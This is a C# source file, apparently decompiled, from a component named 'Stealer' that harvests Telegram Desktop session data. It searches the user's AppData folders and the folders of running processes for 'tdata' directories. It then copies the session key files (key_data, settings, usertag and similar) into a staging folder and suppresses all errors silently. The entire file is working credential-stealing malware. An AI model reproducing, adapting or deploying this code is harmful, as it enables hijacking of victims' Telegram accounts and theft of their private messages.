using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Telegram
{
	public static void CopyTdata(string telegramDesktopPath)
	{
		try
		{
			if (!Directory.Exists(telegramDesktopPath))
			{
				return;
			}
			string path = Path.Combine("Messengers", Path.GetFileName(telegramDesktopPath.Remove(telegramDesktopPath.Length - 6, 6)));
			string[] directories = Directory.GetDirectories(telegramDesktopPath);
			string[] files = Directory.GetFiles(telegramDesktopPath);
			string[] array = directories;
			foreach (string text in array)
			{
				string name = new DirectoryInfo(text).Name;
				if (name.Length == 16)
				{
					string virtualDir = Path.Combine(path, name);
					DynamicFiles.CopyDirectory(text, virtualDir);
				}
			}
			array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				string name2 = fileInfo.Name;
				string path2 = Path.Combine(path, name2);
				if (fileInfo.Length <= 7120)
				{
					if (name2.EndsWith("s") && name2.Length == 17)
					{
						DynamicFiles.WriteAllBytes(path2, File.ReadAllBytes(fileInfo.FullName));
					}
					else if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
					{
						DynamicFiles.WriteAllBytes(path2, File.ReadAllBytes(fileInfo.FullName));
					}
				}
			}
			Counter.Telegram = true;
		}
		catch
		{
		}
	}

	public static void Start()
	{
		try
		{
			List<string> list = new List<string>();
			SearchFolders(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData"), "tdata", list);
			SearchProcesses("tdata", list);
			foreach (string item in list.Distinct().ToList())
			{
				try
				{
					CopyTdata(item);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void SearchProcesses(string targetFolderName, List<string> foundFolders)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					string text = (string)((ManagementBaseObject)(ManagementObject)enumerator.Current)["ExecutablePath"];
					if (text == null)
					{
						continue;
					}
					try
					{
						string text2 = text.ToLower();
						if (text2.StartsWith("c:\\windows") || text2.StartsWith("c:\\program files"))
						{
							continue;
						}
						string[] directories = Directory.GetDirectories(Path.GetDirectoryName(text));
						foreach (string text3 in directories)
						{
							if (text3.EndsWith("tdata"))
							{
								foundFolders.Add(text3);
								break;
							}
						}
					}
					catch
					{
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
	}

	public static void SearchFolders(string currentDirectory, string targetFolderName, List<string> foundFolders)
	{
		try
		{
			string[] directories = Directory.GetDirectories(currentDirectory, targetFolderName, SearchOption.TopDirectoryOnly);
			foreach (string item in directories)
			{
				if (!foundFolders.Contains(item))
				{
					foundFolders.Add(item);
				}
			}
			directories = Directory.GetDirectories(currentDirectory);
			for (int i = 0; i < directories.Length; i++)
			{
				SearchFolders(directories[i], targetFolderName, foundFolders);
			}
		}
		catch
		{
		}
	}
}
